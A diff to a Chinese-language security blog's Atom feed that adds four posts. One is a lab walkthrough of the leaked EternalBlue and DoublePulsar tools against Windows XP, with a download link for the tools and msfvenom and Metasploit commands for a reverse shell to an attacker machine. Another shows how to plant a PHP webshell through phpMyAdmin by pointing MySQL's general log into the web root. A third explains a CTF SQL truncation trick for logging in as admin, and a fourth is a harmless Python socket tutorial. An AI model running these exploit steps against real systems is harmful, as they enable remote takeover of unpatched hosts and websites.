@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="1ablades.github.io/"/>
-  <updated>2017-08-07T08:50:17.987Z</updated>
+  <updated>2017-08-08T07:44:27.484Z</updated>
   <id>1ablades.github.io/</id>
   
   <author>
@@ -14,6 +14,257 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ShadowBrokers漏洞利用工具使用（1）</title>
+    <link href="1ablades.github.io/2017/04/19/ShadowBrokers%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%EF%BC%881%EF%BC%89/"/>
+    <id>1ablades.github.io/2017/04/19/ShadowBrokers漏洞利用工具使用（1）/</id>
+    <published>2017-04-19T07:43:23.000Z</published>
+    <updated>2017-08-08T07:44:27.484Z</updated>
+    
+    <content type="html"><![CDATA[<p>FuzzBunch之Eternalblue</p>
+<p>利用MS17-010漏洞 入侵winxp win server 2008 或 win7。<br>最近方程式组织爆出漏洞以及shadowbrokers放出的工具搞得沸沸扬扬，本篇的工具shadowbrokers早在12年就已经写出来了，有点可怕。<br>附上工具链接<br>链接：<a href="http://pan.baidu.com/s/1ge2RFVH" target="_blank" rel="external">http://pan.baidu.com/s/1ge2RFVH</a> 密码：0dtr</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ul>
+<li>win7     攻击机   192.168.226.128    环境需要python2.6.6以及pywin32</li>
+<li>winxp    靶机     192.168.226.130    开启SMB服务 445端口 建议关闭防火墙</li>
+<li>kali2             192.168.226.136    用来生成攻击payload和反弹shell</li>
+</ul>
+<h3 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a>工具利用</h3><p>将windows目录拷贝到攻击机win7上，在目录下建立文件夹listeningposts</p>
+<p>运行fb.py</p>
+<p><img src="http://123.206.81.232/img/eternalblue/fb_1.png" alt="请输入图片描述"><br><img src="http://123.206.81.232/img/eternalblue/fb_2.png" alt="请输入图片描述"></p>
+<p>日志就放在windows下有个log_dirs<br>之后会询问new project name 就是日志文件名称</p>
+<p>然后执行</p>
+<pre><code>use ETERNALBLUE
+</code></pre><p>一路回车直到</p>
+<p><img src="http://123.206.81.232/img/eternalblue/fb_3.png" alt="请输入图片描述"></p>
+<p>这里mode选择1 使用常规部署方式 也就是在靶机上建立后门 带有模糊测试</p>
+<p>然后一路回车</p>
+<p><img src="http://123.206.81.232/img/eternalblue/fb_4.png" alt="请输入图片描述"></p>
+<p>执行成功</p>
+<p>然后我们到kali2下用msf生成用于反弹shell的dll</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=8089 -f dll &gt; reverser_tcp.dll
+</code></pre><p>将reverser_tcp.dll文件拷贝到win7的C盘根目录下<br>在msf下开启msfpayload监听</p>
+<pre><code>msfconsole
+
+msf &gt;   use exploit/multi/handler
+        set LHOST 192.168.226.136
+        set LPORT 8089
+        set PAYLOAD windows/meterpreter/reverse_tcp
+        exploit
+</code></pre><p><img src="http://123.206.81.232/img/eternalblue/fb_5.png" alt="请输入图片描述"></p>
+<p>然后在winxp中执行</p>
+<pre><code>use DOUBLEPULSAR
+</code></pre><p><img src="http://123.206.81.232/img/eternalblue/fb_6.png" alt="请输入图片描述"><br><img src="http://123.206.81.232/img/eternalblue/fb_7.png" alt="请输入图片描述"></p>
+<p>利用成功</p>
+<p><img src="http://123.206.81.232/img/eternalblue/fb_8.png" alt="请输入图片描述"><br><img src="http://123.206.81.232/img/eternalblue/fb_9.png" alt="请输入图片描述"></p>
+<p>成功控制靶机</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;FuzzBunch之Eternalblue&lt;/p&gt;
+&lt;p&gt;利用MS17-010漏洞 入侵winxp win server 2008 或 win7。&lt;br&gt;最近方程式组织爆出漏洞以及shadowbrokers放出的工具搞得沸沸扬扬，本篇的工具shadowbrokers早在12
+    
+    </summary>
+    
+    
+      <category term="Web安全 工具" scheme="1ablades.github.io/tags/Web%E5%AE%89%E5%85%A8-%E5%B7%A5%E5%85%B7/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>phpMyAdmin getshell</title>
+    <link href="1ablades.github.io/2017/04/11/phpMyAdmin-getshell/"/>
+    <id>1ablades.github.io/2017/04/11/phpMyAdmin-getshell/</id>
+    <published>2017-04-11T07:41:13.000Z</published>
+    <updated>2017-08-08T07:42:32.660Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Win XP<br>Apache 2.0<br>PHP 5.3.29<br>MySQL 5.0.8-dev</p>
+<p>条件：<br>    拥有MySQL的root权限</p>
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>首先我们以root登陆phpMyAdmin<br>试一下利用OUT INTOFILE来getshell</p>
+<p><img src="http://123.206.81.232/img/phpmyadmin_getshell/1.png" alt="请输入图片描述"></p>
+<p>执行以上语句，会发现已经写入了小马</p>
+<p><img src="http://123.206.81.232/img/phpmyadmin_getshell/2.png" alt="请输入图片描述"></p>
+<p>因为我用的mysql 版本较低，所以可以写马，如果mysql版本在5.7.6以上，则会出现错误</p>
+<pre><code>#1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement.
+</code></pre><p>原因是 mysql中有一个全局变量secure-file-priv，这个变量默认参数为NULL，只要在my.ini中添加一行secure-file-priv=’路径’即可</p>
+<p>那么如果网站这样做了，将OUT INTOFILE禁用了，我们该怎样getshell呢</p>
+<p>利用的就是MySQL 5.0+版本会自动创建日志文件，所以可以修改全局变量来变动文件位置，但是日志生成的目录要有可读可写的权限。</p>
+<p>首先要了解两个MySQL的全局变量</p>
+<p>general_log          是日志保存状态 ON/OFF 开启后将保存每一条执行的SQL语句到文件中<br>general_log_file    是日志的保存路径</p>
+<p>首先查看下全局变量：</p>
+<p><img src="http://123.206.81.232/img/phpmyadmin_getshell/3.png" alt="请输入图片描述"></p>
+<p>目前为OFF状态，将他修改为ON</p>
+<pre><code>SET GLOBAL general_log=&apos;ON&apos;
+</code></pre><p>查看目录发现一个新文件被创建<br>内容如下</p>
+<blockquote>
+<p>MySQLa, Version: 5.5.40 (MySQL Community Server (GPL)). started with:<br>TCP Port: 3306, Named Pipe: MySQL Time                 Id Command<br>Argument 170411 16:02:58       17 Quit<br>           18 Connect    root@localhost on<br>           18 Query    SET CHARACTER SET ‘utf8’<br>           18 Query    SET collation_connection = ‘utf8_general_ci’<br>           18 Init DB    mysql<br>           18 Query    SHOW MASTER LOGS<br>           18 Query    SELECT USER()<br>           18 Quit<br>           19 Connect    root@localhost on<br>           19 Query    SET CHARACTER SET ‘utf8’<br>           19 Query    SET collation_connection = ‘utf8_general_ci’<br>           19 Query    SHOW DATABASES<br>           19 Quit     170411 16:02:59       20 Connect    root@localhost on<br>           20 Query    SET CHARACTER SET ‘utf8’<br>           20 Query    SET collation_connection = ‘utf8_general_ci’<br>           20 Quit<br>           21 Connect    root@localhost on<br>           21 Query    SET CHARACTER SET ‘utf8’<br>           21 Query    SET collation_connection = ‘utf8_general_ci’<br>           21 Quit</p>
+</blockquote>
+<p>然后我们执行一条语句</p>
+<pre><code>SELECT MD5(&apos;admin&apos;)
+</code></pre><p>再打开文件</p>
+<blockquote>
+<p>MySQLa, Version: 5.5.40 (MySQL Community Server (GPL)). started with:<br>TCP Port: 3306, Named Pipe: MySQL Time                 Id Command<br>Argument 170411 16:02:58       17 Quit<br>           18 Connect    root@localhost on<br>           18 Query    SET CHARACTER SET ‘utf8’<br>           18 Query    SET collation_connection = ‘utf8_general_ci’<br>           18 Init DB    mysql<br>           18 Query    SHOW MASTER LOGS<br>           18 Query    SELECT USER()<br>           18 Quit<br>           19 Connect    root@localhost on<br>           19 Query    SET CHARACTER SET ‘utf8’<br>           19 Query    SET collation_connection = ‘utf8_general_ci’<br>           19 Query    SHOW DATABASES<br>           19 Quit     170411 16:02:59       20 Connect    root@localhost on<br>           20 Query    SET CHARACTER SET ‘utf8’<br>           20 Query    SET collation_connection = ‘utf8_general_ci’<br>           20 Quit<br>           21 Connect    root@localhost on<br>           21 Query    SET CHARACTER SET ‘utf8’<br>           21 Query    SET collation_connection = ‘utf8_general_ci’<br>           21 Quit     170411 16:04:49       22 Connect    root@localhost on<br>           22 Query    SET CHARACTER SET ‘utf8’<br>           22 Query    SET collation_connection = ‘utf8_general_ci’<br>           22 Init DB    mysql<br>           22 Query    SHOW MASTER LOGS<br>           22 Quit<br>           23 Connect    root@localhost on<br>           23 Query    SET CHARACTER SET ‘utf8’<br>           23 Query    SET collation_connection = ‘utf8_general_ci’<br>           23 Quit     170411 16:05:06       24 Connect    root@localhost on<br>           24 Query    SET CHARACTER SET ‘utf8’<br>           24 Query    SET collation_connection = ‘utf8_general_ci’<br>           24 Query    SELECT MD5(‘admin’)<br>           24 Init DB    mysql<br>           24 Query    SHOW MASTER LOGS<br>           24 Quit     170411 16:05:07       25 Connect    root@localhost on<br>           25 Query    SET CHARACTER SET ‘utf8’<br>           25 Query    SET collation_connection = ‘utf8_general_ci’<br>           25 Quit</p>
+</blockquote>
+<p>既然可以写，那么就好办了，我们可以直接写shell</p>
+<pre><code>SET GLOBAL general_log_file=&apos;C:/www/1.php&apos;
+</code></pre><p><img src="http://123.206.81.232/img/phpmyadmin_getshell/4.png" alt="请输入图片描述"></p>
+<p>1.php被创建，然后我们就可以往里写shell了</p>
+<pre><code>SELECT &apos;&lt;?php phpinfo(); ?&gt;&apos;
+</code></pre><p><img src="http://123.206.81.232/img/phpmyadmin_getshell/5.png" alt="请输入图片描述"></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt;Win XP&lt;br&gt;Apache 2.0&lt;br&gt;PHP 5.3.29&lt;br&gt;MySQL 5.0.8-dev&lt;/p&gt;
+&lt;p&gt;条件：&lt;br&gt;  
+    
+    </summary>
+    
+    
+      <category term="Web安全" scheme="1ablades.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Python socket 网络编程</title>
+    <link href="1ablades.github.io/2017/03/29/Python-socket-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
+    <id>1ablades.github.io/2017/03/29/Python-socket-网络编程/</id>
+    <published>2017-03-29T07:39:25.000Z</published>
+    <updated>2017-08-08T07:43:05.630Z</updated>
+    
+    <content type="html"><![CDATA[<p>socket可以实现网络上，两个程序的通信实现数据交换。</p>
+<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p>实现以下工作：</p>
+<ul>
+<li>创建socket</li>
+<li>建立连接</li>
+<li>收发数据</li>
+</ul>
+<pre><code># -*- coding:utf-8 -*-
+
+import socket
+import sys  #for exit
+
+try:
+    #create an AF_INET, STREAM socket (TCP)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    #socket()两个参数 Address Family: 可以选择AF_INET(用于Internet进程间通信)，AF_UNIX(用于同一台机器进程间通信)
+    #Type :可以选择SOCKET_STREAM(流式套接字，主要用于TCP),SOCKET_DGRAM(数据报套接字，用于UDP)
+except socket.error, msg:   #错误处理
+    print &apos;Failed to create socket. Error code: &apos; + str(msg[0]) + &apos;, Error message :&apos; + msg[1]
+    sys.exit()
+
+print &apos;Socket Created&apos;
+
+host = &apos;www.baidu.com&apos;
+port = 80
+try:
+    remote_ip = socket.gethostbyname(host)      #获取ip
+except socket.gaierror:
+    #could not resolve
+    print &apos;Hostname could not be resolved. Exiting&apos;
+    sys.exit()
+
+print &apos;Ip address of&apos; + host + &apos; is &apos; + remote_ip
+
+#Connect to remote server
+s.connect((remote_ip, port))            #进行连接
+
+print &apos;Socket connected to &apos; + host + &apos; on ip &apos; + remote_ip
+
+#Send some data to remote server
+message= &quot;GET / HTTP/1.1\r\n\r\n&quot;
+
+try:
+    s.sendall(message)       #发送数据  
+except socket.error:
+    print &apos;Send failed&apos;
+    sys.exit()
+
+print &apos;Message send successfully&apos;
+
+#Now receive data
+reply = s.recv(4096)  #接受长度为4096字节的数据
+
+print reply
+
+s.close()
+</code></pre><p>执行结果<br><img src="http://123.206.81.232/img/python_socket/4.png" alt="请输入图片描述"></p>
+<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>实现以下工作：</p>
+<ul>
+<li>创建socket</li>
+<li>绑定socket到特定的地址及端口</li>
+<li>监听连接</li>
+<li>建立连接</li>
+<li>接发数据</li>
+</ul>
+<p>要实现多个用户连接并且发送多条数据，需要用到线程。<br>code:</p>
+<pre><code># -*- coding:utf-8 -*-
+
+import socket
+import sys
+from thread import *
+
+HOST = &apos;&apos;
+PORT = 8888
+
+s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print &apos;Socket created&apos;
+
+try:
+    s.bind((HOST, PORT)) #绑定socket 到地址和端口上
+except socket.error, msg:
+    print &apos;Bind failed. Error Code : &apos; + str(msg[0]) + &apos; Message &apos; + msg[1]
+    sys.exit()
+
+print &apos;Socket blind complete&apos;
+
+s.listen(10)       #进行监听
+print &apos;Socket now listening&apos;
+
+#Function for handling connections. This will be used to create threads
+def clientthread(conn):
+    #Sending message to connected client
+    conn.send(&apos;Welcome to the server. Type somthing and hit enter\n&apos;) #send only takes string
+
+    #infinite loop so that function do not terminate and thread do not end
+    while True:
+        #Receiving from client
+        data = conn.recv(1024)
+        if not data:
+            break
+
+        print addr[0] + &apos;:&apos; + str(addr[1]) + &apos; say:&apos; + data
+        conn.sendall(data)
+
+#now keep talking whith the client
+while 1:
+    #wait to accept a connection - blocking call
+    conn, addr = s.accept()
+
+    #display client informaiton
+    print &apos;Connected with &apos; + addr[0] + &apos;:&apos; + str(addr[1])
+
+    #start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function
+    start_new_thread(clientthread, (conn,))
+
+s.close()
+</code></pre><p>执行结果<br><img src="http://123.206.81.232/img/python_socket/1.png" alt="请输入图片描述"><br><img src="http://123.206.81.232/img/python_socket/2.png" alt="请输入图片描述"><br><img src="http://123.206.81.232/img/python_socket/3.png" alt="请输入图片描述"><br>可以由多个终端连接，并且可以发送多条信息。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;socket可以实现网络上，两个程序的通信实现数据交换。&lt;/p&gt;
+&lt;h2 id=&quot;客户端&quot;&gt;&lt;a href=&quot;#客户端&quot; class=&quot;headerlink&quot; title=&quot;客户端&quot;&gt;&lt;/a&gt;客户端&lt;/h2&gt;&lt;p&gt;实现以下工作：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;创建socket&lt;
+    
+    </summary>
+    
+    
+      <category term="编程 Python 网络" scheme="1ablades.github.io/tags/%E7%BC%96%E7%A8%8B-Python-%E7%BD%91%E7%BB%9C/"/>
+    
+  </entry>
   
   <entry>
     <title>Linux下blog(TypEcho)搭建</title>
@@ -108,6 +359,73 @@ $ yum install php-devel
     
     </summary>
     
+    
+  </entry>
+  
+  <entry>
+    <title>SQL字符限制导致任意用户登陆</title>
+    <link href="1ablades.github.io/2017/03/14/SQL%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86/"/>
+    <id>1ablades.github.io/2017/03/14/SQL字符限制导致任意用户登陆/</id>
+    <published>2017-03-14T07:36:10.000Z</published>
+    <updated>2017-08-08T07:38:09.199Z</updated>
+    
+    <content type="html"><![CDATA[<p>上个星期末打NJCTF，一共没做两个题，蓝瘦。<br>其中有一个Web，是一个后台登陆页面，可以注册新用户，试着注册登陆后，提示不是admin。<br>所以要以admin身份登陆，于是想到爆破，但感觉这个题并不是。纠结了好一会，表哥告诉是<br>基于约束的SQL攻击这个东西。</p>
+<p>一般用户注册后端代码如下：</p>
+<pre><code>&lt;?php
+// Checking whether a user with the same username exists
+$username = mysql_real_escape_string($_GET[&apos;username&apos;]);
+$password = mysql_real_escape_string($_GET[&apos;password&apos;]);
+$query = &quot;SELECT *
+  FROM users
+  WHERE username=&apos;$username&apos;&quot;;
+$res = mysql_query($query, $database);
+if($res) {
+  if(mysql_num_rows($res) &gt; 0) {
+// User exists, exit gracefully
+.
+.
+  }
+  else {
+// If not, only then insert a new entry
+$query = &quot;INSERT INTO users(username, password)
+  VALUES (&apos;$username&apos;,&apos;$password&apos;)&quot;;
+.
+.
+  }
+}
+</code></pre><p>验证用户登陆代码如下：</p>
+<pre><code>&lt;?php
+$username = mysql_real_escape_string($_GET[&apos;username&apos;]);
+$password = mysql_real_escape_string($_GET[&apos;password&apos;]);
+$query = &quot;SELECT username FROM users
+          WHERE username=&apos;$username&apos;
+              AND password=&apos;$password&apos; &quot;;
+$res = mysql_query($query, $database);
+if($res) {
+  if(mysql_num_rows($res) &gt; 0){
+      $row = mysql_fetch_assoc($res);
+      return $row[&apos;username&apos;];
+  }
+}
+return Null;
+</code></pre><p>也利用mysql_real_escape_string()函数过滤了用户输入，但是我们攻击的点不在这里，而是在服务器的SQL上。</p>
+<p>首先，SQL进行字符串处理时，大部分会将字符串后无用的空格删去(WHERE的字符串或者INSERT的字符串等)，也就是说”string[空格]”与”string”是等同的。<br>当然也有例外，比如LIKE语句，因为LIKE函数比较时，要俩字符串长度相等，所以会将短的字符串后面填充空格。</p>
+<p>所以假设username的varchar(10)，我们注册username=’admin[十个空格]1’</p>
+<pre><code>SELECT * FROM users WHERE username=&apos;$username&apos;;
+</code></pre><p>执行这条语句时，SQL查询的是’admin[十个空格]1’这个字符串，并不会找到匹配的结果。</p>
+<pre><code>INSERT INTO users(username， password) VALUES(&apos;admin          1&apos;,&apos;anypassword&apos;);
+</code></pre><p>这里INSERT查询时，SQL会根据创建表时的varchar(n)来限制字符串的最大长度,所以我们插入的username就会变成admin加5个空格。<br>这样数据库中就会有两个admin用户了，当我们进行登陆admin时，SQL进行SELECT就会返回原始admin的记录，这样我们就可以以admin的身份登陆了。<br>此攻击已在MySQL和SQLite上成功测试。</p>
+<p>如果要防护，可以使用UNIQUE约束，UNIQUE约束确保在非主键列中不输入重复的值。一般使用id作为数据库表的主键，在后端验证时可以验证id。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;上个星期末打NJCTF，一共没做两个题，蓝瘦。&lt;br&gt;其中有一个Web，是一个后台登陆页面，可以注册新用户，试着注册登陆后，提示不是admin。&lt;br&gt;所以要以admin身份登陆，于是想到爆破，但感觉这个题并不是。纠结了好一会，表哥告诉是&lt;br&gt;基于约束的SQL攻击这个东西
+    
+    </summary>
+    
+    
+      <category term="CTF php Web安全" scheme="1ablades.github.io/tags/CTF-php-Web%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
